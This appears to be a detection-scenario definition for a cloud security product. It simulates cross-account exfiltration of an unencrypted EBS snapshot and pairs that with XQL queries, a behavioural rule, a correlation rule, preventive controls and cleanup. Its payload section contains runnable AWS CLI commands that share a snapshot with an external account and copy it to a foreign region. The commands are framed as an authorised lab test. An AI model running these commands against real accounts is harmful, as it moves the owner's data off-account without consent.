identity.name: Unencrypted-Snapshot / KMS-Gap Posture Finding Correlated to Cross-Account Snapshot Export (T1537 / T1578.001 / T1552.005 / T1530)
identity.summary: An unencrypted (no-CMK) EBS snapshot flagged by CSPM is exported cross-account via ModifySnapshotAttribute/CopySnapshot by a compute identity operating outside its home region. Cortex Cloud fuses the encryption-gap finding, the export event, and the impossible-travel identity into one 'unencrypted asset exfiltrated via snapshot share' incident.
identity.description: A point-in-time posture scan can tell you a snapshot is unencrypted; it cannot tell you that the unencrypted snapshot just left the account. This scenario exercises Cortex Cloud's posture-to-exfil correlation, not its flat-scan capability, and is deliberately weighted to CORRELATION. Unit 42's 2025 cloud-alert-trend analysis reports the runtime signals that make this chain real: cloud snapshot exports rose 45% (peaking November), IAM API requests from outside a compute resource's home region rose 60%, IAM impossible-travel alerts rose 116%, and suspicious multi-object cloud-storage downloads rose 305% — the exact motion of an intruder who finds a readable, unencrypted snapshot and ships it off-account. The chain fuses three signals with a two-hop join: the posture finding joins the export on snapshot_id (posture state has no acting identity, so principal is not part of that hop), and the export joins the off-baseline-region identity on principal — the external destination account rides along as export evidence. Signal A is the CSPM encryption gap: an EBS snapshot whose Encrypted attribute is false or whose KmsKeyId resolves to no customer-managed key (an unencrypted-at-rest posture violation) — the gap is what makes the data readable once the snapshot is off-account, because there is no CMK the destination account lacks. Signal B is the runtime export: a ModifySnapshotAttribute call that adds an external accountId to the snapshot's createVolumePermission, plus a CopySnapshot into a foreign region — the control-plane proof the data crossed the account boundary (T1537 Transfer Data to Cloud Account, T1578.001 Create Snapshot). Signal C is behavioral: the acting compute identity is an EC2 instance role whose credentials were minted at the Instance Metadata endpoint (T1552.005) yet is now issuing API calls from a region outside the instance's learned home region — impossible travel for a cloud compute identity. An ABIOC anchors that deviation to the role's learned home-region baseline rather than to any single bad API. A CR-CSPM correlation rule fuses A+B+C into a single exfil incident: the encryption gap made the data readable off-account, and the export event proves it left. Detection is Analytics/XQL/Correlation with one behavioral ABIOC for the impossible-travel leg — posture is configuration state and export is control-plane state, so the validation queries assert the snapshot is unencrypted, that a cross-account share and foreign-region copy occurred, that the acting identity issued a snapshot-export call from a region outside its learned baseline, and that the same snapshot_id ties the posture finding to the export. This gives a DC the differentiated Cortex Cloud story: not 'you have an unencrypted snapshot' but 'this unencrypted snapshot was just exfiltrated cross-account by an off-region instance role — here is the single stitched incident.'

campaigns: Cross-account snapshot-share exfiltration of unencrypted cloud volumes

execution.framework_reference_id: SIM-CSPM-004 — Export an unencrypted (no-CMK) EBS snapshot cross-account and correlate the CSPM encryption-gap finding to the runtime share

prerequisites.description: Cortex Cloud CSPM enabled and connected (read-only) to the target AWS account, flagging the disposable snapshot as unencrypted / no-customer-managed-key.
A disposable EBS snapshot exists in a known unencrypted (Encrypted=false, no CMK) state, tagged CortexSimSnapshotExfil, safe to share to an operator-owned lab account.

payload.code:
# Cross-account snapshot-export exfil injection (authorized, reversible) against a
# disposable, tagged EBS snapshot that CSPM already flags as unencrypted (no CMK).
# SAFE-MODE: the destination account is an operator-owned lab account and the
# createVolumePermission grant is removed by cleanup. No customer data leaves.
set -euo pipefail
SNAP="${DRIFT_SNAPSHOT_ID:-snap-0cortexsim0exfil0}"
DEST="${EXTERNAL_ACCOUNT_ID:-999988887777}"
# (B) share the unencrypted snapshot cross-account via ModifySnapshotAttribute
aws ec2 modify-snapshot-attribute --snapshot-id "$SNAP" --attribute createVolumePermission --operation-type add --user-ids "$DEST" --profile "${AWS_PROFILE:-cortexsim-lab}" || true
# (B) copy it into a foreign region so the export crosses a region boundary too
aws ec2 copy-snapshot --source-region "${HOME_REGION:-us-east-1}" --source-snapshot-id "$SNAP" --destination-region "${FOREIGN_REGION:-ap-southeast-1}" --profile "${AWS_PROFILE:-cortexsim-lab}" || true
echo '[CortexSim] SIM-CSPM-004 cross-account snapshot export injected on the unencrypted lab snapshot'

input_variables.name: DRIFT_SNAPSHOT_ID
input_variables.description: Disposable, unencrypted (no-CMK) lab EBS snapshot tagged CortexSimSnapshotExfil.

input_variables.name: EXTERNAL_ACCOUNT_ID
input_variables.description: Operator-owned lab AWS account the snapshot is shared to (the external createVolumePermission grantee). Not a real victim account.

input_variables.name: FOREIGN_REGION
input_variables.description: Foreign region the CopySnapshot targets to model a cross-region export.

input_variables.name: AWS_PROFILE
input_variables.description: Named AWS CLI profile scoped to the disposable exfil-target snapshot.

expected_artifacts.description: ModifySnapshotAttribute adds an external account to the snapshot's createVolumePermission — the control-plane cross-account share.
expected_artifacts.expected_value: event_name = "ModifySnapshotAttribute" and attribute_type = "createVolumePermission" and request_add_account_id != owner_account_id

expected_artifacts.description: The exported snapshot is flagged unencrypted / no-customer-managed-key in the posture inventory.
expected_artifacts.expected_value: resource_type = "aws_ebs_snapshot" and finding_class = "snapshot-no-customer-managed-key" and tags contains "CortexSimSnapshotExfil"

cleanup.code: aws ec2 modify-snapshot-attribute --snapshot-id "${DRIFT_SNAPSHOT_ID:-snap-0cortexsim0exfil0}" --attribute createVolumePermission --operation-type remove --user-ids "${EXTERNAL_ACCOUNT_ID:-999988887777}" --profile "${AWS_PROFILE:-cortexsim-lab}" || true; echo '[CortexSim] SIM-CSPM-004 cleanup complete — cross-account snapshot share revoked.'

abiocs.name: CSPM-004 Impossible Travel by Cloud Compute Identity
abiocs.description: An EC2 instance role whose credentials were minted at the Instance Metadata endpoint issues a snapshot-export control-plane call (ModifySnapshotAttribute / CopySnapshot / CreateSnapshot) from a region that is NOT in the role's learned region baseline. Routine cross-region and global-service traffic (STS, IAM, CloudFront, Route53, cross-region S3/DynamoDB) is deliberately excluded: the ABIOC fires only when an off-baseline-region call co-occurs with a sensitive snapshot-export action by the same IMDS-minted identity — never on a bare region mismatch, which for a compute role calling global services is normal. Every individual API call is legitimate in isolation; the ABIOC fires on the rarity-plus-co-occurrence deviation from the compute identity's learned home-region baseline and anchors it to the IMDS credential lineage, catching the off-region actor behind the snapshot export that a static rule keyed on one API name would miss.
abiocs.logic:
dataset = cloud_audit_logs
| filter _time > to_timestamp(current_time() - 3600)
| filter cloud_provider = "AWS"
| filter user_identity_type = "AssumedRole" and credential_source = "ec2-instance-metadata"
| filter event_name in ("ModifySnapshotAttribute", "CopySnapshot", "CreateSnapshot")
| filter aws_region != instance_home_region and region_in_role_baseline = false
| comp count() as sensitive_new_region_calls, values(event_name) as export_actions by user_identity_arn, src_ip, aws_region
| sort desc sensitive_new_region_calls
| fields user_identity_arn, src_ip, aws_region, export_actions, sensitive_new_region_calls
abiocs.causality_anchor: Learned per-role region baseline (the set of regions an EC2 instance role has historically called from) -> IMDS-minted assumed-role credential -> a snapshot-export control-plane call (ModifySnapshotAttribute / CopySnapshot / CreateSnapshot) issued from a region NOT in that learned baseline, diverging from the baseline while co-occurring with a sensitive export action, anchored to the instance-metadata credential lineage.

xql_queries.name: CSPM-004 Unencrypted Snapshot KMS-Gap Posture Finding
xql_queries.query:
dataset = cortex_cloud_posture
| filter _time > to_timestamp(current_time() - 3600)
| filter cloud_provider = "AWS" and resource_type = "aws_ebs_snapshot"
| filter tags contains "CortexSimSnapshotExfil"
| filter compliance_state = "drifted" and finding_class in ("snapshot-unencrypted", "snapshot-no-customer-managed-key")
| comp count() as finding_rows by snapshot_id, finding_class
| sort desc finding_rows
| fields snapshot_id, finding_class, finding_rows

xql_queries.name: CSPM-004 Cross-Account Snapshot Share via ModifySnapshotAttribute
xql_queries.query:
dataset = cloud_audit_logs
| filter _time > to_timestamp(current_time() - 3600)
| filter cloud_provider = "AWS" and event_source = "ec2.amazonaws.com"
| filter event_name = "ModifySnapshotAttribute" and attribute_type = "createVolumePermission" and operation_type = "add"
| filter request_add_account_id != "" and request_add_account_id != owner_account_id
| comp count() as external_shares by snapshot_id, request_add_account_id, user_identity_arn
| filter external_shares >= 1
| sort desc external_shares
| fields snapshot_id, request_add_account_id, user_identity_arn, external_shares

xql_queries.name: CSPM-004 Snapshot Copy to Foreign Region
xql_queries.query:
dataset = cloud_audit_logs
| filter _time > to_timestamp(current_time() - 3600)
| filter cloud_provider = "AWS" and event_source = "ec2.amazonaws.com"
| filter event_name in ("CopySnapshot", "CreateSnapshot")
| filter aws_region != home_region
| comp count() as cross_region_copies by snapshot_id, aws_region, user_identity_arn
| filter cross_region_copies >= 1
| sort desc cross_region_copies
| fields snapshot_id, aws_region, user_identity_arn, cross_region_copies

xql_queries.name: CSPM-004 Compute Identity Operating Outside Home Region
xql_queries.query:
dataset = cloud_audit_logs
| filter _time > to_timestamp(current_time() - 3600)
| filter cloud_provider = "AWS"
| filter user_identity_type = "AssumedRole" and credential_source = "ec2-instance-metadata"
| filter event_name in ("ModifySnapshotAttribute", "CopySnapshot", "CreateSnapshot")
| filter aws_region != instance_home_region and region_in_role_baseline = false
| comp count() as off_region_export_calls, values(aws_region) as new_regions by user_identity_arn, src_ip
| sort desc off_region_export_calls
| fields user_identity_arn, src_ip, new_regions, off_region_export_calls

xql_queries.name: CSPM-004 Snapshot Export Coverage Reconciliation
xql_queries.query:
dataset = cloud_audit_logs
| filter _time > to_timestamp(current_time() - 3600)
| filter cloud_provider = "AWS" and event_source = "ec2.amazonaws.com"
| filter event_name in ("ModifySnapshotAttribute", "CopySnapshot", "CreateSnapshot")
| filter snapshot_id != ""
| comp count_distinct(event_name) as export_action_classes by snapshot_id, user_identity_arn
| filter export_action_classes >= 1
| sort desc export_action_classes
| fields snapshot_id, user_identity_arn, export_action_classes

correlation_rules.name: Unencrypted Asset Exfiltrated via Cross-Account Snapshot Share
correlation_rules.logic: XQL(CSPM-004 Unencrypted Snapshot KMS-Gap Posture Finding) AND XQL(CSPM-004 Cross-Account Snapshot Share via ModifySnapshotAttribute) AND ( ABIOC(CSPM-004 Impossible Travel by Cloud Compute Identity) OR XQL(CSPM-004 Snapshot Copy to Foreign Region) ) — fuses the CSPM encryption-gap finding (an EBS snapshot with no customer-managed KMS key) with the runtime cross-account ModifySnapshotAttribute share and the off-baseline-region compute identity. The join is two-hop: posture leg A joins to export leg B on snapshot_id (posture state carries no acting identity, so principal is NOT part of the A↔B key), and export leg B joins to the off-region identity leg C on principal (user_identity_arn); the external destination account_id rides along from leg B as export evidence, not as a join key. This raises one 'unencrypted asset exfiltrated via snapshot share' incident: the encryption gap made the data readable off-account and the share/copy event proves it left.

threat_scenarios.name: Encryption-Gap Posture Finding Correlated to Cross-Account Snapshot Exfiltration
threat_scenarios.description: Cortex Cloud detects that an unencrypted (no-CMK) EBS snapshot flagged by CSPM was exported cross-account at runtime (ModifySnapshotAttribute createVolumePermission + CopySnapshot to a foreign region) by a compute identity operating outside its home region, and stitches the encryption-gap finding, the export event, and the impossible-travel identity into a single exfiltration incident.

threat_steps.objective: The unencrypted-snapshot posture finding and the runtime cross-account share both surface on the same snapshot within one scan cycle.
preconditions: Cortex Cloud CSPM connected (read-only) with the disposable snapshot flagged unencrypted / no-CMK.
The snapshot is tagged CortexSimSnapshotExfil and safe to share to the operator-owned lab account.
steps: Confirm the snapshot is flagged unencrypted (no customer-managed KMS key) in the posture inventory.
Share the snapshot cross-account via ModifySnapshotAttribute and copy it to a foreign region.
Observe the encryption-gap posture query and the cross-account-share query both return >= 1 on the same snapshot_id.
success_criteria: XQL `CSPM-004 Unencrypted Snapshot KMS-Gap Posture Finding` returns >= 1.
XQL `CSPM-004 Cross-Account Snapshot Share via ModifySnapshotAttribute` returns >= 1 attributed to a principal.
XQL `CSPM-004 Snapshot Export Coverage Reconciliation` returns export_action_classes >= 1 on the shared snapshot_id.

threat_steps.objective: The posture finding, the export, and the off-region compute identity fuse into one exfil incident — posture↔export joined on snapshot_id, export↔identity joined on principal, destination account carried as evidence.
preconditions: The acting identity is an EC2 instance role whose credentials were minted at the Instance Metadata endpoint.
The ModifySnapshotAttribute / CopySnapshot events are captured in cloud_audit_logs.
steps: Issue the export API calls from a region outside the instance's home region.
Observe the impossible-travel ABIOC fire on the compute identity.
Observe CR-CSPM-0004 raise one exfil incident naming the snapshot, the principal, and the destination account.
success_criteria: ABIOC `CSPM-004 Impossible Travel by Cloud Compute Identity` fires on the acting instance role.
Correlation CR-CSPM-0004 raises one 'unencrypted asset exfiltrated via snapshot share' incident stitching the encryption-gap finding to the cross-account export.

preventive_controls: Enforce EBS encryption-by-default with a customer-managed KMS key at the account level so no snapshot can exist unencrypted, and deny cross-account key grants on that CMK.
Deny ec2:ModifySnapshotAttribute (createVolumePermission add) to any external account via SCP except for a break-glass role, so an unencrypted snapshot cannot be shared off-account.
Scope EC2 instance-role permissions tightly and require IMDSv2 so metadata-minted credentials cannot be trivially harvested and replayed from off-region.
detection_engineering: Escalate an unencrypted / no-CMK snapshot finding to an incident the moment that same snapshot_id is shared cross-account or copied to a foreign region — join the posture inventory to cloud_audit_logs on snapshot_id.
Baseline each compute identity's home region and alert on assumed-role IMDS credentials issuing API calls from a foreign region or a non-cloud ASN (impossible travel for a compute identity).
Correlate the encryption gap, the ModifySnapshotAttribute/CopySnapshot export, and the off-region principal into one incident rather than three separate posture and runtime alerts.
